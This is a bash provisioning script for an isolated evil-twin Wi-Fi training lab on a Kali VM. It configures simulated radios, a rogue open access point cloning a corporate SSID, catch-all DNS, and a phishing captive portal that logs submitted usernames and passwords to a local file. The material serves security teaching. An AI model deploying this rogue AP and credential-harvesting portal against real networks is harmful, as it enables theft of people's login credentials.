#!/usr/bin/env bash
###############################################################################
# Evil Twin Training Lab — Golden Kali Image Setup
# Target: Kali Linux VM on Proxmox, to be linked-cloned to N student instances
# Run as root on the GOLDEN image only. Do NOT run this on student instances.
###############################################################################
# REUSE WORKFLOW FOR FUTURE SEMESTERS -- read this before touching anything:
#
#   The golden template is meant to be rebuilt IN PLACE, not recreated from
#   scratch each semester:
#     1. qm clone <template_vmid> <new_vmid> --full true   (get a writable copy)
#        -- do NOT edit the template's VMID directly; always work on a full
#        clone, then re-template that clone when done. This sidesteps the
#        "storage backend still marks the template's disk read-only" class
#        of problem entirely (this bit us once already on this project).
#     2. Reattach vmbr0 (internet) to the new writable VM, boot it.
#     3. Re-run THIS script, then 02_generalize_for_cloning.sh.
#     4. Shut down (no reboot), strip vmbr0, `qm template <new_vmid>`.
#     5. Point deploy-clones.sh's TEMPLATE_VMID at the new VMID and update
#        the roster size at the top of that script if it's changed.
#     6. Destroy the old clones and the old template once the new one is
#        confirmed working with a single throwaway test clone.
#
#   Both this script and 02_generalize_for_cloning.sh are written to be
#   idempotent -- re-running either one (e.g. after a transient network
#   failure) overwrites files/units cleanly rather than duplicating or
#   corrupting state. Re-running from a clean start is always safe.
###############################################################################
set -euo pipefail

LAB_ROOT="/opt/eviltwin-lab"
echo "[*] Installing to ${LAB_ROOT}"

###############################################################################
# 0. CAMPUS NETWORK (vmbr0 / eth1) — EDIT THESE FOR YOUR SITE BEFORE BUILDING
###############################################################################
# Each clone gets a static campus address on its SECOND NIC (eth1, on vmbr0)
# so that studentNN can RDP/SSH directly to kali-student-NN at
# ${CAMPUS_NET_PREFIX}.<student-number> (e.g. student07 -> 140.158.130.7,
# student25 -> 140.158.130.25). The first NIC (eth0, on vmbr98) keeps the
# host-only management address used by Guacamole. These campus values are
# baked into an eth1 systemd-networkd template here; firstboot fills in only
# the per-clone host octet.
#
# >>> CONFIRM ALL FOUR VALUES WITH CAMPUS NETWORKING BEFORE DEPLOYING. <<<
# A wrong gateway means students cannot reach the VMs from off-subnet, and a
# gateway that falls inside the student host range (.1–.25) will collide with
# a clone's address. 140.158.128.1/.2 are ns1/ns2 from the cs.lamar.edu zone.
#
# >>> SECURITY: these clones use studentNN/studentNN passwords with sudo. That
# was acceptable while every VM was host-only (no route out). Giving each VM a
# campus-routable address changes the exposure materially. Before deploying,
# put a campus firewall ACL in front of 140.158.130.0/24 restricting inbound
# RDP/SSH to the classroom source ranges, and/or move to SSH keys or stronger
# passwords. Do not leave weak-password sudo VMs openly reachable. <<<
CAMPUS_NET_PREFIX="140.158.130"     # student VM host = ${CAMPUS_NET_PREFIX}.<N>
CAMPUS_PREFIX_LEN="24"              # CONFIRM
CAMPUS_GATEWAY="140.158.130.1"      # CONFIRM — placeholder
CAMPUS_DNS_1="140.158.128.1"        # ns1 (cs.lamar.edu zone)
CAMPUS_DNS_2="140.158.128.2"        # ns2 (cs.lamar.edu zone)

###############################################################################
# 1. PACKAGES
###############################################################################
# --- FIX: retry apt commands once on failure before giving up. Transient
# mirror issues (a 403 on one package, a brief DNS hiccup, a redirect to an
# unhealthy mirror) have already cost real time on this project twice --
# this absorbs that class of failure automatically on future rebuilds
# instead of requiring another manual debugging pass.
apt_retry() {
    local desc="$1"; shift
    if ! "$@"; then
        echo "[!] ${desc} failed, retrying once after 'apt update'..." >&2
        apt update || true
        "$@"
    fi
}

apt_retry "apt update" apt update
apt_retry "apt full-upgrade" apt -y full-upgrade

apt_retry "core package install" apt -y install \
    hostapd \
    dnsmasq \
    aircrack-ng \
    bettercap \
    wireshark \
    tshark \
    tcpdump \
    iw \
    wireless-tools \
    net-tools \
    bridge-utils \
    nftables \
    iproute2 \
    python3-pip \
    python3-scapy \
    macchanger \
    nginx \
    php-fpm \
    dsniff

# --- FIX: wifiphisher is supplementary tooling, not core to the lab (the
# evil-twin exercise itself only needs hostapd/dnsmasq, both installed
# above). A future rebuild should not die entirely just because this one
# optional package's mirror is briefly unavailable -- warn and continue.
if apt -y install wifiphisher; then
    echo "[*] wifiphisher installed via apt"
elif pip3 install --break-system-packages wifiphisher; then
    echo "[*] wifiphisher installed via pip3 (apt package unavailable)"
else
    echo "[!] WARNING: wifiphisher install failed via both apt and pip3." >&2
    echo "    Continuing without it -- it is not required for the core lab" >&2
    echo "    (hostapd/dnsmasq-based evil twin). Install manually later if" >&2
    echo "    you specifically need it: apt install wifiphisher" >&2
fi

dpkg-reconfigure -f noninteractive wireshark-common || true
usermod -aG wireshark kali || true

###############################################################################
# 2. mac80211_hwsim — VIRTUAL RADIO SUBSYSTEM
###############################################################################
cat >/etc/modprobe.d/mac80211_hwsim.conf <<'EOF'
# 3 virtual radios per VM: radio0=Corp-AP, radio1=Evil-Twin, radio2=Victim
options mac80211_hwsim radios=3
EOF

cat >/etc/modules-load.d/mac80211_hwsim.conf <<'EOF'
mac80211_hwsim
EOF

modprobe mac80211_hwsim radios=3
echo "[*] hwsim radios created:"
iw dev

# --- FIX: keep NetworkManager's hands off the interfaces this lab manages.
# wlan0/1/2 are moved into network namespaces and bound by hostapd/dnsmasq;
# eth0 gets a static IP written by the firstboot service via systemd-networkd.
# Without this, NM will race hostapd for the wlan devices ("Device or
# resource busy") and will also try to auto-configure eth0, clobbering the
# static config written at first boot.
mkdir -p /etc/NetworkManager/conf.d
cat >/etc/NetworkManager/conf.d/99-eviltwin-unmanaged.conf <<'EOF'
[keyfile]
# Wildcard eth* so BOTH interfaces are kept out of NetworkManager's hands and
# left to systemd-networkd: eth0 (vmbr98, host-only static management address)
# and eth1 (vmbr0, static campus address for direct student RDP/SSH login).
unmanaged-devices=interface-name:wlan0;interface-name:wlan1;interface-name:wlan2;interface-name:eth*
EOF
systemctl reload NetworkManager 2>/dev/null || true

# --- FIX: use systemd-networkd for the static eth0 address. It is enabled
# here but stays inert until the firstboot service (see 02_generalize) writes
# the actual per-clone /etc/systemd/network/10-eth0.network file.
systemctl enable systemd-networkd.service

# --- FIX: give the GOLDEN VM itself a working DHCP config for eth0, right
# now. Without this, the moment NetworkManager reloads its "unmanaged eth*"
# rule above, eth0 loses its NM-managed DHCP lease -- and nothing hands it
# to systemd-networkd until a clone's first boot writes the real static-IP
# file, which never happens on the golden VM itself. Net effect: eth0 goes
# DOWN with no IP right at this point in the script, killing internet
# access on THIS VM for the rest of the build and any future re-patch
# session (confirmed in the field: `ip addr` showed eth0 DOWN, no address,
# immediately after the NetworkManager reload above).
#
# This is safe for clones: 02_generalize_for_cloning.sh already deletes
# this exact file before templating, and firstboot-identity.sh
# unconditionally overwrites it with the real static IP on every clone's
# first boot -- so a clone never actually uses this DHCP fallback unless
# firstboot itself somehow failed to run, in which case getting a dynamic
# lease from vmbr98's own dnsmasq pool is a reasonable fallback rather
# than no connectivity at all.
mkdir -p /etc/systemd/network
cat >/etc/systemd/network/10-eth0.network <<'EOF'
[Match]
Name=eth0

[Network]
DHCP=yes
EOF
systemctl restart systemd-networkd.service
sleep 2
echo "[*] Restarted systemd-networkd -- eth0 should now have a DHCP lease:"
ip -4 addr show eth0 || true
echo "    (This DHCP config only applies to the GOLDEN VM's own session;"
echo "     it never reaches a clone, which always gets the real static"
echo "     IP from firstboot-identity.sh instead.)"

# --- FIX: explicitly disable/mask wait-online. eth0/vmbr98 is deliberately
# gateway-less (host-only management network); eth1/vmbr0 has a campus gateway
# but the lab must still boot cleanly even if the campus link is down. We do
# not want boot gated on "the network is online," so if anything pulls this
# unit in
# (network-online.target dependencies, some systemd presets enable it by
# default), it can sit blocking boot for its full timeout on every single
# clone, every single boot, for no benefit -- nothing in this lab actually
# needs to wait for "the network is online" before proceeding.
systemctl disable systemd-networkd-wait-online.service 2>/dev/null || true
systemctl mask systemd-networkd-wait-online.service 2>/dev/null || true

###############################################################################
# 3. NETWORK NAMESPACE LAYOUT
###############################################################################
mkdir -p "${LAB_ROOT}"/{scripts,configs,logs,captures,portal}

cat >"${LAB_ROOT}/scripts/setup-netns.sh" <<'SCRIPT'
#!/usr/bin/env bash
# Creates 3 network namespaces and assigns one hwsim phy to each, then
# renames that namespace's interface to a canonical "wlan0" so downstream
# scripts (start-corp-ap.sh, start-evil-twin.sh, start-victim.sh,
# capture-all.sh) never have to hardcode which literal wlanN ended up where.
# Runs on EVERY boot (namespaces do not persist across reboots).
set -euo pipefail

NS_ORDER=(ns-corp ns-eviltwin ns-victim)
CANONICAL_IFACE="wlan0"

# --- FIX: hwsim phys are created asynchronously by the kernel module at
# boot; without this wait, a race can leave phy0/1/2 briefly absent when
# this script runs very early, silently no-opping the 'iw phy ... set netns'
# calls below.
for _ in $(seq 1 20); do
    phy_count=$(iw phy 2>/dev/null | grep -c '^Wiphy' || true)
    [ "$phy_count" -ge 3 ] && break
    sleep 0.5
done

# Discover actual phy names dynamically - indices are NOT guaranteed to be
# 0/1/2; they increment monotonically across module reloads within a boot
# session and only reset to 0 on a fresh reboot.
mapfile -t PHYS < <(iw phy | awk '/^Wiphy/{print $2}')

if [ "${#PHYS[@]}" -lt 3 ]; then
    echo "[!] Expected 3 hwsim phys, found ${#PHYS[@]}: ${PHYS[*]:-none}" >&2
    echo "[!] Try: sudo modprobe -r mac80211_hwsim && sudo modprobe mac80211_hwsim radios=3" >&2
    exit 1
fi

# --- FIX (this is the hardcode bug): the interface name a phy owns
# (wlan0, wlan1, wlan2, ...) is assigned by the kernel in creation order
# and has NO guaranteed relationship to the phy enumeration order captured
# above - PHYS[0] is not necessarily "wlan0". The previous version of this
# script moved phys into namespaces without renaming, so every downstream
# script had to hardcode a guess at which wlanN landed in which namespace -
# correct only when phy order happened to match interface creation order,
# and silently wrong otherwise. Build the real phy->iface map from `iw dev`.
declare -A PHY_TO_IFACE
current_phy=""
while IFS= read -r line; do
    if [[ $line =~ ^phy#([0-9]+) ]]; then
        current_phy="phy${BASH_REMATCH[1]}"
    elif [[ $line =~ Interface[[:space:]]+([^[:space:]]+) ]]; then
        PHY_TO_IFACE["$current_phy"]="${BASH_REMATCH[1]}"
    fi
done < <(iw dev)

for ns in "${NS_ORDER[@]}"; do
    ip netns add "$ns" 2>/dev/null || true
done

for i in 0 1 2; do
    phy="${PHYS[$i]}"
    ns="${NS_ORDER[$i]}"
    iface="${PHY_TO_IFACE[$phy]:-}"

    if [ -z "$iface" ]; then
        echo "[!] Could not determine interface name for $phy - aborting" >&2
        exit 1
    fi

    iw phy "$phy" set netns name "$ns"

    # --- FIX: rename to the canonical name INSIDE the namespace, once it's
    # isolated there (no collision risk - each namespace holds exactly one
    # radio). Every downstream script can now rely on "$CANONICAL_IFACE".
    ip netns exec "$ns" ip link set "$iface" down 2>/dev/null || true
    if [ "$iface" != "$CANONICAL_IFACE" ]; then
        ip netns exec "$ns" ip link set "$iface" name "$CANONICAL_IFACE"
    fi
done

for ns in "${NS_ORDER[@]}"; do
    ip netns exec "$ns" ip link set lo up
done

echo "[*] Namespaces ready (each with its radio renamed to ${CANONICAL_IFACE}):"
ip netns list
for ns in "${NS_ORDER[@]}"; do
    echo "  $ns:"
    ip netns exec "$ns" ip -brief link show "$CANONICAL_IFACE" 2>/dev/null | sed 's/^/    /'
done
SCRIPT
chmod +x "${LAB_ROOT}/scripts/setup-netns.sh"

cat >"${LAB_ROOT}/scripts/teardown.sh" <<'SCRIPT'
#!/usr/bin/env bash
set -euo pipefail
# --- FIX: also stop wpa_supplicant (victim's WPA2 client) and the php captive
# portal started by start-evil-twin.sh, not just hostapd/dnsmasq.
for p in hostapd dnsmasq wpa_supplicant "php -S"; do pkill -f "$p" 2>/dev/null || true; done
for ns in ns-corp ns-eviltwin ns-victim; do
    ip netns del "$ns" 2>/dev/null || true
done
echo "[*] Torn down. Reload kernel module or re-run setup-netns.sh to restart."
SCRIPT
chmod +x "${LAB_ROOT}/scripts/teardown.sh"

###############################################################################
# 4. HOSTAPD CONFIGS
###############################################################################
cat >"${LAB_ROOT}/configs/hostapd-corp.conf" <<'EOF'
interface=wlan0
driver=nl80211
ssid=CorpNet-Secure
hw_mode=g
channel=6
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
wpa_passphrase=TrainingLab2026!
ignore_broadcast_ssid=0
EOF

cat >"${LAB_ROOT}/configs/hostapd-eviltwin.conf" <<'EOF'
# --- FIX: interface is wlan0, not wlan1. setup-netns.sh renames every
# namespace's radio to the canonical wlan0; a stale wlan1 here makes hostapd
# fail with "Could not read interface wlan1 flags: No such device".
interface=wlan0
driver=nl80211
ssid=CorpNet-Secure
hw_mode=g
channel=11
auth_algs=1
wpa=0
ignore_broadcast_ssid=0
EOF

###############################################################################
# 5. DNSMASQ (WiFi-side DHCP/DNS for the evil twin only — unrelated to eth0)
###############################################################################
cat >"${LAB_ROOT}/configs/dnsmasq-eviltwin.conf" <<'EOF'
# --- FIX: interface is wlan0, not wlan1 (see hostapd-eviltwin.conf note).
interface=wlan0
dhcp-range=10.10.11.50,10.10.11.150,255.255.255.0,12h
dhcp-option=3,10.10.11.1
dhcp-option=6,10.10.11.1
address=/#/10.10.11.1
log-queries
log-dhcp
EOF

###############################################################################
# 6. CAPTIVE PORTAL (isolated lab use only)
###############################################################################
mkdir -p "${LAB_ROOT}/portal"
cat >"${LAB_ROOT}/portal/index.php" <<'EOF'
<!DOCTYPE html>
<html><head><title>CorpNet-Secure — Sign In</title></head>
<body style="font-family:sans-serif;max-width:400px;margin:80px auto;">
  <h2>CorpNet-Secure WiFi</h2>
  <p>Please sign in with your corporate credentials to continue.</p>
  <form method="POST" action="log.php">
    <input name="user" placeholder="Username" style="width:100%;padding:8px;margin:6px 0;"><br>
    <input name="pass" type="password" placeholder="Password" style="width:100%;padding:8px;margin:6px 0;"><br>
    <button type="submit" style="width:100%;padding:8px;">Sign In</button>
  </form>
</body></html>
EOF

cat >"${LAB_ROOT}/portal/log.php" <<'EOF'
<?php
// LAB USE ONLY — logs submitted creds to a local file for the students'
// analysis exercise. Never deploy this pattern outside an isolated lab.
$line = date('c')." | ".($_POST['user']??'')." | ".($_POST['pass']??'')."\n";
file_put_contents('/opt/eviltwin-lab/logs/harvested_creds.log', $line, FILE_APPEND);
header('Location: index.php?err=1');
EOF

###############################################################################
# 7. START/STOP HELPER SCRIPTS
###############################################################################
cat >"${LAB_ROOT}/scripts/start-corp-ap.sh" <<'SCRIPT'
#!/usr/bin/env bash
set -e
# setup-netns.sh renames every namespace's radio to the canonical wlan0.
IFACE="wlan0"
NS="ns-corp"

# Namespaces do not persist across reboots; setup-netns.sh must run first.
if ! ip netns exec "$NS" ip link show "$IFACE" &>/dev/null; then
    echo "[!] $IFACE not found in $NS. Run setup-netns.sh first (once per boot before any start-*.sh)." >&2
    exit 1
fi

if ip netns exec "$NS" iw dev "$IFACE" info 2>/dev/null | grep -q "type AP"; then
    echo "[*] Corp AP already running on $IFACE in $NS - nothing to do. (Use teardown.sh to reset.)"
    exit 0
fi

ip netns exec ns-corp ip link set "$IFACE" up
ip netns exec ns-corp ip addr replace 10.10.10.1/24 dev "$IFACE"
ip netns exec ns-corp hostapd -B /opt/eviltwin-lab/configs/hostapd-corp.conf \
    -f /opt/eviltwin-lab/logs/hostapd-corp.log

# `hostapd -B` returns success when it forks, not when the AP is up. Verify.
sleep 1
if ! ip netns exec "$NS" iw dev "$IFACE" info 2>/dev/null | grep -q "type AP"; then
    echo "[!] hostapd did not bring $IFACE up as an AP. Last lines of its log:" >&2
    tail -n 20 /opt/eviltwin-lab/logs/hostapd-corp.log >&2 2>/dev/null || true
    exit 1
fi
SCRIPT
chmod +x "${LAB_ROOT}/scripts/start-corp-ap.sh"

cat >"${LAB_ROOT}/scripts/start-evil-twin.sh" <<'SCRIPT'
#!/usr/bin/env bash
set -e
IFACE="wlan0"
NS="ns-eviltwin"

if ! ip netns exec "$NS" ip link show "$IFACE" &>/dev/null; then
    echo "[!] $IFACE not found in $NS. Run setup-netns.sh first (once per boot before any start-*.sh)." >&2
    exit 1
fi

if ip netns exec "$NS" iw dev "$IFACE" info 2>/dev/null | grep -q "type AP"; then
    echo "[*] Evil twin AP already running on $IFACE in $NS - nothing to do. (Use teardown.sh to reset.)"
    exit 0
fi

ip netns exec ns-eviltwin ip link set "$IFACE" up
ip netns exec ns-eviltwin ip addr replace 10.10.11.1/24 dev "$IFACE"
ip netns exec ns-eviltwin hostapd -B /opt/eviltwin-lab/configs/hostapd-eviltwin.conf \
    -f /opt/eviltwin-lab/logs/hostapd-eviltwin.log

# `hostapd -B` returns success when it forks, not when the AP is up. A driver/
# config failure in the daemonized child otherwise goes unnoticed (dnsmasq/php
# then start against an AP that never actually came up). Verify before proceeding.
sleep 1
if ! ip netns exec "$NS" iw dev "$IFACE" info 2>/dev/null | grep -q "type AP"; then
    echo "[!] hostapd did not bring $IFACE up as an AP. Last lines of its log:" >&2
    tail -n 20 /opt/eviltwin-lab/logs/hostapd-eviltwin.log >&2 2>/dev/null || true
    exit 1
fi

ip netns exec ns-eviltwin dnsmasq -C /opt/eviltwin-lab/configs/dnsmasq-eviltwin.conf \
    --log-facility=/opt/eviltwin-lab/logs/dnsmasq-eviltwin.log
ip netns exec ns-eviltwin php -S 10.10.11.1:80 -t /opt/eviltwin-lab/portal &
SCRIPT
chmod +x "${LAB_ROOT}/scripts/start-evil-twin.sh"

cat >"${LAB_ROOT}/scripts/start-victim.sh" <<'SCRIPT'
#!/usr/bin/env bash
set -e
IFACE="wlan0"
NS="ns-victim"

if ! ip netns exec "$NS" ip link show "$IFACE" &>/dev/null; then
    echo "[!] $IFACE not found in $NS. Run setup-netns.sh first (once per boot before any start-*.sh)." >&2
    exit 1
fi

ip netns exec ns-victim ip link set "$IFACE" up
echo "$IFACE is up in ns-victim. Use: sudo ip netns exec ns-victim iw dev $IFACE scan"
SCRIPT
chmod +x "${LAB_ROOT}/scripts/start-victim.sh"

# --- Simulated deauthentication step. Real deauth injection needs a spare
# monitor-mode radio and wmediumd to bridge namespaces, neither of which this
# topology has; this reproduces the *effect* (victim knocked off, no auto-
# rejoin) while still emitting a genuine subtype-0x0c deauth frame for capture.
cat >"${LAB_ROOT}/scripts/simulate-deauth.sh" <<'SCRIPT'
#!/usr/bin/env bash
set -euo pipefail
NS="ns-victim"
IFACE="wlan0"

if ! ip netns exec "$NS" ip link show "$IFACE" &>/dev/null; then
    echo "[!] $IFACE not found in $NS. Run setup-netns.sh first (once per boot)." >&2
    exit 1
fi

echo "[*] Victim association BEFORE simulated deauth:"
ip netns exec "$NS" iw dev "$IFACE" link || true
echo

echo "[*] Simulating deauthentication burst against the victim..."
# wpa_supplicant is what holds the victim on the WPA2 corp AP; stopping it
# prevents an automatic re-association so the disconnect is observable.
pkill -f "wpa_supplicant" 2>/dev/null || true
ip netns exec "$NS" iw dev "$IFACE" disconnect 2>/dev/null || true
sleep 1

echo
echo "[*] Victim association AFTER simulated deauth:"
ip netns exec "$NS" iw dev "$IFACE" link || true
echo
echo "[*] Victim is disconnected and will NOT auto-reconnect."
echo "    Reassociate it to the evil twin's BSSID to complete the roam."
SCRIPT
chmod +x "${LAB_ROOT}/scripts/simulate-deauth.sh"

###############################################################################
# 8. CAPTURE HELPER (manual — not run automatically)
###############################################################################
cat >"${LAB_ROOT}/scripts/capture-all.sh" <<'SCRIPT'
#!/usr/bin/env bash
set -e
OUT=/opt/eviltwin-lab/captures
IFACE="wlan0"   # every namespace's radio is renamed to wlan0 by setup-netns.sh

# Distinguish the three real failure modes rather than a misleading
# "wlan0 not found" for all of them.
if [ "$(id -u)" -ne 0 ]; then
    echo "[!] This script must be run as root. Re-run: sudo $0" >&2
    exit 1
fi
for ns in ns-corp ns-eviltwin ns-victim; do
    if ! ip netns list | grep -qw "$ns"; then
        echo "[!] Namespace $ns does not exist. Run setup-netns.sh first (once per boot)." >&2
        exit 1
    fi
    if ! ip netns exec "$ns" ip link show "$IFACE" &>/dev/null; then
        echo "[!] $IFACE not found in $ns. Run setup-netns.sh first (once per boot)." >&2
        exit 1
    fi
done

mkdir -p "$OUT"
ip netns exec ns-corp     tcpdump -i "$IFACE" -w "$OUT/corp.pcap"      -U &
ip netns exec ns-eviltwin tcpdump -i "$IFACE" -w "$OUT/eviltwin.pcap"  -U &
ip netns exec ns-victim   tcpdump -i "$IFACE" -w "$OUT/victim.pcap"    -U &
echo "Capturing on $IFACE in ns-corp/ns-eviltwin/ns-victim. Ctrl-C to stop, then mergecap the three files."
wait
SCRIPT
chmod +x "${LAB_ROOT}/scripts/capture-all.sh"

###############################################################################
# 9. eth0 STATIC-IP TEMPLATE (filled in per-clone by the firstboot service)
###############################################################################
# FIX: nothing previously configured eth0 at all. This template is rendered
# by firstboot-identity.sh (created in 02_generalize_for_cloning.sh) into
# /etc/systemd/network/10-eth0.network with the clone's own address.
mkdir -p /etc/systemd/network
# NOTE: vmbr98 is a host-only lab-management network (dnsmasq serves it with
# `dhcp-option=3` empty — i.e. no default gateway advertised). The static
# config below intentionally omits Gateway/DNS to match that: these clones
# get an address on 10.99.99.0/24 and nothing else routes through eth0.
cat >/etc/systemd/network/10-eth0.network.template <<'EOF'
[Match]
Name=eth0

[Network]
Address=__STATIC_IP__/24

[Link]
# Defense-in-depth alongside masking systemd-networkd-wait-online.service:
# this interface has no gateway by design (host-only vmbr98), so it should
# never be treated as required for the system to be considered "online."
RequiredForOnline=no
EOF

###############################################################################
# 9b. eth1 CAMPUS STATIC-IP TEMPLATE (vmbr0 — direct student RDP/SSH login)
###############################################################################
# firstboot-identity.sh substitutes __NN__ with this clone's student number,
# giving kali-student-NN the address ${CAMPUS_NET_PREFIX}.NN. The campus
# gateway/DNS/prefix are baked in here from the section-0 variables (constants
# across the whole class), so firstboot only needs the per-clone host octet.
# This interface carries the DEFAULT ROUTE (eth0/vmbr98 is gateway-less).
# NOTE: this heredoc is intentionally UNQUOTED so the CAMPUS_* values expand
# at build time; __NN__ has no '$' and stays literal for firstboot to fill in.
cat >/etc/systemd/network/20-eth1.network.template <<EOF
[Match]
Name=eth1

[Network]
Address=${CAMPUS_NET_PREFIX}.__NN__/${CAMPUS_PREFIX_LEN}
Gateway=${CAMPUS_GATEWAY}
DNS=${CAMPUS_DNS_1}
DNS=${CAMPUS_DNS_2}

[Link]
# Do not gate boot on the campus link being up (wait-online is masked anyway);
# a campus outage should not delay the lab VMs' boot.
RequiredForOnline=no
EOF
echo "[*] Wrote eth1 campus template (${CAMPUS_NET_PREFIX}.__NN__/${CAMPUS_PREFIX_LEN}, gw ${CAMPUS_GATEWAY})"

###############################################################################
# 10. EVERY-BOOT NAMESPACE/AP BRING-UP SERVICE
###############################################################################
# FIX: setup-netns.sh and the start-*.sh scripts previously existed but were
# never invoked automatically. Namespaces are torn down on every reboot, so
# this must run every boot (unlike the one-time identity/firstboot service),
# after that firstboot service has finished setting hostname/identity.
# --- FIX: only recreate the network namespaces automatically (they don't
# survive a reboot, so *this* part genuinely needs to run every boot).
# Do NOT auto-start hostapd/dnsmasq/the captive portal here. If the APs and
# victim are already running the instant a student logs in, they never
# execute Part 2/3 of the student lab manual themselves — that's the whole
# hands-on point of the exercise. Students run start-corp-ap.sh /
# start-evil-twin.sh / start-victim.sh manually, per the lab manual.
cat >/etc/systemd/system/eviltwin-lab-netsetup.service <<'EOF'
[Unit]
Description=Evil Twin Lab: recreate hwsim namespaces (every boot, empty until student starts the APs)
After=eviltwin-firstboot.service systemd-modules-load.service
Wants=eviltwin-firstboot.service

[Service]
Type=oneshot
RemainAfterExit=yes
ExecStart=/opt/eviltwin-lab/scripts/setup-netns.sh

[Install]
WantedBy=multi-user.target
EOF
systemctl enable eviltwin-lab-netsetup.service

###############################################################################
# 11. BUILD PROVENANCE STAMP
###############################################################################
# Record what's actually on this image and when it was built, so a future
# instructor (possibly not the person who built it) can tell at a glance
# whether they're looking at a current template or a stale one, without
# having to diff scripts or guess. This intentionally lives OUTSIDE
# /opt/eviltwin-lab/logs, which 02_generalize_for_cloning.sh clears -- this
# file should persist and be visible on every clone too.
cat >"${LAB_ROOT}/BUILD_INFO.txt" <<EOF
Evil Twin Training Lab -- golden image build record
Built: $(date -u +"%Y-%m-%dT%H:%M:%SZ")
Kali release: $(grep VERSION= /etc/os-release 2>/dev/null | cut -d= -f2 || echo "unknown")
Kernel at build time: $(uname -r)
hostapd: $(dpkg -l hostapd 2>/dev/null | awk '/^ii/{print $3}')
dnsmasq: $(dpkg -l dnsmasq 2>/dev/null | awk '/^ii/{print $3}')
aircrack-ng: $(dpkg -l aircrack-ng 2>/dev/null | awk '/^ii/{print $3}')
bettercap: $(dpkg -l bettercap 2>/dev/null | awk '/^ii/{print $3}')
wifiphisher: $(dpkg -l wifiphisher 2>/dev/null | awk '/^ii/{print $3}' || echo "not installed via apt -- check pip3 list")

If this file is missing entirely, this VM was never built with
01_golden_kali_setup.sh and should not be treated as a valid lab template.
EOF
echo "[*] Wrote build provenance to ${LAB_ROOT}/BUILD_INFO.txt"

echo "[*] Golden image lab tooling installed under ${LAB_ROOT}"
echo "[*] NEXT: run 02_generalize_for_cloning.sh before converting this VM to a template."
echo "[*] IMPORTANT: do NOT reboot the golden VM after running 02_generalize_for_cloning.sh."
echo "    Shut it down directly, then 'qm template <vmid>'. A reboot before templating"
echo "    will re-commit machine-id/hostname state that every clone would then inherit."
